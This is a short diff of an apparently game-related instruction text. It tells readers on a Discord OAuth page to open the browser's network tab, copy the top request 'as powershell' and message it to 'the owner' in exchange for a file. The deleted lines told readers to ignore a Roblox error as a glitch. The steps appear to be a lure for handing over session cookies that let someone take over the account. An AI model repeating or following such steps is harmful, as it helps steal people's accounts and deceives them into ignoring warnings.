@@ -7,5 +7,4 @@ if you are on the website that this bot send you https://discord.com/oauth2/auth
 go to inspect=newtwork= the one on the top is the name of the game you gonna copy you are going to right click it and then copy= copy as powershell 
 if you did that message the owner the copied powershell and youre done the owner will now send you the file
 
-READ THIS!!
-IF YOU ARE ON THE WEBSITE IT SHOWS YOU AN ROBLOX ERROR JUST IGNORE IT IT IS A GLITCH
+
